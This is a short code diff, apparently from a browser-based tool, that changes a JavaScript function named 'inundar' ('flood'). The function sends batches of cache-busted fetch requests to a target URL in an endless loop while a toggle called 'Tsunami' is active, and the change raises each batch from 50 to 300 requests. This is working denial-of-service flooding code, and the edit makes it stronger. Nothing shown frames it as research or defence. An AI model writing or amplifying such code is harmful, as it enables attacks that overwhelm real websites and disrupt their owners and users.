@@ -65,7 +65,7 @@ async function toggleTsunami() {
 
 async function inundar(url) {
     while (ativo) {
-        const lote = 50;
+        const lote = 300;
         const disparos = Array.from({ length: lote }, () => 
             fetch(`${url}?t=${Math.random()}`, { mode: 'no-cors', cache: 'no-store' })
                 .then(() => { 
